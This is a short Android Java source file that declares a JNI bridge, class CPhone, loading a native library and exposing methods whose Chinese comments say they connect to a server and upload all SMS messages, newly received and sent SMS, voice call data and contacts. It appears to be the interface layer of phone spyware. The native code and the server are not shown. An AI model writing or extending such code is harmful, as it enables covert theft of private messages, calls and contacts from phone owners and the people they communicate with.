package com.example.myphone;

import android.util.Log;

public class CPhone {
	static 
	{
		System.loadLibrary("MyPhone");
	}
	public static void foo()
	{
		Log.i("MyPhone", "foo");
	}
	
	/*
	 * 网络初始化及连接服务器
	 */
	public native void Start();
	/*
	 * 发送所有短信数据到服务器
	 */
	public native void SendAllSmsMsg(byte[] pByte, int nLen);	
	/*
	 * 发送新接收到的短信数据到服务器
	 */
	public native void SendNewInSms(byte[] pByte, int nLen);	
	/*
	 * 发送新发送的短信数据到服务器
	 */
	public native void SendNewOutSms(byte[] pByte, int nLen);	
	/*
	 * 发送新的语音通讯数据到服务器
	 */
	public native void SendNewVoiceMsg(byte[] pByte, int nLen);	
	/*
	 * 发送联系人数据到服务器
	 */
	public native void SendContacts(byte[] pByte, int nLen);
}
